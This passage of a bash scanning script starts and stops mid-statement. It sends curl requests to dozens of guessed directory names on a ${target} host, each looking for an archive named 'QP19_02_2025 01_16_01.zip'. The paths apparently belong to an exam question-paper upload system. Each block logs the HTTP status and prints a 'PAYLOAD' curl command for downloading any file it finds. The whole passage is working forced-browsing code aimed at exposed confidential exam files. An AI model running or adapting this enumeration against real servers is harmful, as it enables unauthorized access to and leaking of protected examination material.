${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
